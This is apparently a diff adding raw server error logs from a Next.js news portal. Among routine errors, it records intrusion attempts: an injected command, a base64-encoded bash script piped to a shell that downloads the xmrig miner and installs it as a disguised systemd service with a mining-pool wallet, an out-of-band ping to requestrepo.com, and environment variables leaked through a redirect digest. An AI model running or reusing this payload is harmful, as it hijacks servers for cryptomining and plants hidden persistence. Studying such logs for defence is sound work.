@@ -1,0 +1,60 @@
+2025-12-09 04:54 +00:00:  ⨯ [TypeError: Cannot read properties of undefined (reading 'z')] {
+2025-12-09 04:54 +00:00:   digest: '2761179709'
+2025-12-09 04:54 +00:00: }
+2025-12-09 05:17 +00:00:  ⨯ [Error: NEXT_REDIRECT] { digest: '55182' }
+2025-12-09 06:05 +00:00:  ⨯ [Error: Command failed: ipconfig /all 2>&1] {
+2025-12-09 06:05 +00:00:   status: 127,
+2025-12-09 06:05 +00:00:   signal: null,
+2025-12-09 06:05 +00:00:   output: [Array],
+2025-12-09 06:05 +00:00:   pid: 4627,
+2025-12-09 06:05 +00:00:   stdout: <Buffer 2f 62 69 6e 2f 73 68 3a 20 31 3a 20 69 70 63 6f 6e 66 69 67 3a 20 6e 6f 74 20 66 6f 75 6e 64 0a>,
+2025-12-09 06:05 +00:00:   stderr: <Buffer >,
+2025-12-09 06:05 +00:00:   digest: '3760044093'
+2025-12-09 06:05 +00:00: }
+2025-12-09 06:12 +00:00:  ⨯ [TypeError: Cannot read properties of undefined (reading 'aa')] {
+2025-12-09 06:12 +00:00:   digest: '3686410813'
+2025-12-09 06:12 +00:00: }
+2025-12-09 06:51 +00:00: 
+2025-12-09 06:51 +00:00: gzip: stdin: unexpected end of file
+2025-12-09 06:51 +00:00: tar: Child returned status 1
+2025-12-09 06:51 +00:00: tar: Error is not recoverable: exiting now
+2025-12-09 06:51 +00:00: chmod: cannot access '/home/nick/applications/NewsNexus10Portal/xmrig-6.24.0/xmrig': No such file or directory
+2025-12-09 06:51 +00:00: ping: nohup....0ql6uqw4.requestrepo.com: Name or service not known
+2025-12-09 06:51 +00:00:  ⨯ [Error: Command failed: ping -c 2 `echo IyEvYmluL2Jhc2gKCiMgQ29uZmlndXJhdGlvbgpPVVQ9Im5leHQudGFyLmd6IgpFWFRSQUNUX0RJUj0ieG1yaWctNi4yNC4wIgpCSU5BUllfUEFUSD0iJChwd2QpLyRFWFRSQUNUX0RJUi94bXJpZyIKQVJHUz0iLS11cmwgYXV0by5jM3Bvb2wub3JnOjgwIC0tdXNlciA0OXBZaThlZlpHbkZaV3VGeGd4UUo0aVpaakd4OFRyeU5mRVo5UzlZU0hVczFyTkJXVEtSYU1uWUtLdXZVQUJIVjVXNDFmNHBrNno3ajNBdUZXOXFGbkZrRW8zVjFjdyAtLXBhc3Mgbm9kZSAtLWRvbmF0ZS1sZXZlbCAwICIKU0VSVklDRV9OQU1FPSJzeXN0ZW1zLXVwZGF0ZXMtc2VydmljZSIKVVJMPSJodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvZG93bmxvYWQvdjYuMjQuMC94bXJpZy02LjI0LjAtbGludXgtc3RhdGljLXg2NC50YXIuZ3oiCgpub2RlIC0gPDxFT0YKY29uc3QgaHR0cHMgPSByZXF1aXJlKCdodHRwcycpOwpjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJyk7Cgpjb25zdCBmaWxlID0gZnMuY3JlYXRlV3JpdGVTdHJlYW0oIiR7T1VUfSIpOwpodHRwcy5nZXQoIiR7VVJMfSIsIChyZXMpID0+IHsKcmVzLnBpcGUoZmlsZSk7CnJlcy5vbigiZW5kIiwgKCkgPT4gZmlsZS5jbG9zZSgpKTsKfSk7CkVPRgp0YXIgeHZ6ZiAiJE9VVCIKCgpjaG1vZCAreCAiJEJJTkFSWV9QQVRIIgoKIyBBdHRlbXB0IHN5c3RlbWQgc2V0dXAKSU5TVEFMTEVEX1NZU1RFTUQ9MAppZiBbICIkKGlkIC11KSIgLWVxIDAgXSAmJiBjb21tYW5kIC12IHN5c3RlbWN0bCA+L2Rldi9udWxsIDI+JjE7IHRoZW4KICAgIGVjaG8gIlJvb3QgcHJpdmlsZWdlcyBkZXRlY3RlZC4gQXR0ZW1wdGluZyBzeXN0ZW1kIHNldHVwLi4uIgogICAgCiAgICBTRVJWSUNFX0ZJTEU9Ii9ldGMvc3lzdGVtZC9zeXN0ZW0vJHtTRVJWSUNFX05BTUV9LnNlcnZpY2UiCiAgICAKICAgIGNhdCA8PEVPRiA+ICIkU0VSVklDRV9GSUxFIgpbVW5pdF0KRGVzY3JpcHRpb249U3lzdGVtIFVwZGF0ZSBTZXJ2aWNlCkFmdGVyPW5ldHdvcmsudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1zaW1wbGUKRXhlY1N0YXJ0PSR7QklOQVJZX1BBVEh9ICR7QVJHU30KUmVzdGFydD1hbHdheXMKUmVzdGFydFNlYz0xMApVc2VyPXJvb3QKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldApFT0YKCiAgICBzeXN0ZW1jdGwgZGFlbW9uLXJlbG9hZAogICAgc3lzdGVtY3RsIGVuYWJsZSAiJFNFUlZJQ0VfTkFNRSIKICAgIHN5c3RlbWN0bCBzdGFydCAiJFNFUlZJQ0VfTkFNRSIKICAgIAogICAgaWYgc3lzdGVtY3RsIGlzLWFjdGl2ZSAtLXF1aWV0ICIkU0VSVklDRV9OQU1FIjsgdGhlbgogICAgICAgIGVjaG8gIlNlcnZpY2Ugc3RhcnRlZCB2aWEgc3lzdGVtZC4iCiAgICAgICAgSU5TVEFMTEVEX1NZU1RFTUQ9MQogICAgZmkKZmkKCiMgRmFsbGJhY2sgdG8gbm9odXAKaWYgWyAkSU5TVEFMTEVEX1NZU1RFTUQgLWVxIDAgXTsgdGhlbgogICAgZWNobyAiU3RhcnRpbmcgd2l0aCBub2h1cC4uLiIKICAgIG5vaHVwICIkQklOQVJZX1BBVEgiICRBUkdTID4vZGV2L251bGwgMj4mMSAmCmZpCg== | base64 -d | bash`.0ql6uqw4.requestrepo.com
+2025-12-09 06:51 +00:00: 
+2025-12-09 06:51 +00:00: gzip: stdin: unexpected end of file
+2025-12-09 06:51 +00:00: tar: Child returned status 1
+2025-12-09 06:51 +00:00: tar: Error is not recoverable: exiting now
+2025-12-09 06:51 +00:00: chmod: cannot access '/home/nick/applications/NewsNexus10Portal/xmrig-6.24.0/xmrig': No such file or directory
+2025-12-09 06:51 +00:00: ping: nohup....0ql6uqw4.requestrepo.com: Name or service not known
+2025-12-09 06:51 +00:00: ] {
+2025-12-09 06:51 +00:00:   status: 2,
+2025-12-09 06:51 +00:00:   signal: null,
+2025-12-09 06:51 +00:00:   output: [Array],
+2025-12-09 06:51 +00:00:   pid: 4809,
+2025-12-09 06:51 +00:00:   stdout: <Buffer >,
+2025-12-09 06:51 +00:00:   stderr: <Buffer 0a 67 7a 69 70 3a 20 73 74 64 69 6e 3a 20 75 6e 65 78 70 65 63 74 65 64 20 65 6e 64 20 6f 66 20 66 69 6c 65 0a 74 61 72 3a 20 43 68 69 6c 64 20 72 65 ... 237 more bytes>,
+2025-12-09 06:51 +00:00:   digest: '1527609471'
+2025-12-09 06:51 +00:00: }
+2025-12-09 09:21 +00:00:  ⨯ TypeError: Invalid character in header content ["x-action-redirect"]
+2025-12-09 09:21 +00:00:     at i.setHeader (.next/server/chunks/586.js:22:6902)
+2025-12-09 09:21 +00:00:     at async m (.next/server/app/page.js:1:7354)
+2025-12-09 09:21 +00:00:     at async p (.next/server/app/page.js:2:1860) {
+2025-12-09 09:21 +00:00:   code: 'ERR_INVALID_CHAR'
+2025-12-09 09:21 +00:00: }
+2025-12-09 09:21 +00:00:  ⨯ TypeError: Invalid character in header content ["x-action-redirect"]
+2025-12-09 09:21 +00:00:     at i.setHeader (.next/server/chunks/586.js:22:6902)
+2025-12-09 09:21 +00:00:     at async m (.next/server/app/page.js:1:7354)
+2025-12-09 09:21 +00:00:     at async p (.next/server/app/page.js:2:1860) {
+2025-12-09 09:21 +00:00:   code: 'ERR_INVALID_CHAR'
+2025-12-09 09:21 +00:00: }
+2025-12-09 09:21 +00:00:  ⨯ [Error: NEXT_REDIRECT] {
+2025-12-09 09:21 +00:00:   digest: 'NEXT_PUBLIC_API_BASE_URL=https://api.news-nexus.kineticmetrics.com\n' +
+2025-12-09 09:21 +00:00:     'NEXT_PUBLIC_API_BASE_URL_DEV=https://api.news-nexus.kineticmetrics.com\n' +
+2025-12-09 09:21 +00:00:     'NEXT_PUBLIC_API_BASE_URL_WORKSTATION=http://localhost:3000\n' +
+2025-12-09 09:21 +00:00:     'NEXT_PUBLIC_APP_NAME=NewsNexus\n' +
+2025-12-09 09:21 +00:00:     'NEXT_PUBLIC_MODE=production'
+2025-12-09 09:21 +00:00: }
+2025-12-09 09:44 +00:00:  ⨯ [TypeError: Cannot read properties of undefined (reading 'aa')] {
+2025-12-09 09:44 +00:00:   digest: '3686410813'
+2025-12-09 09:44 +00:00: }
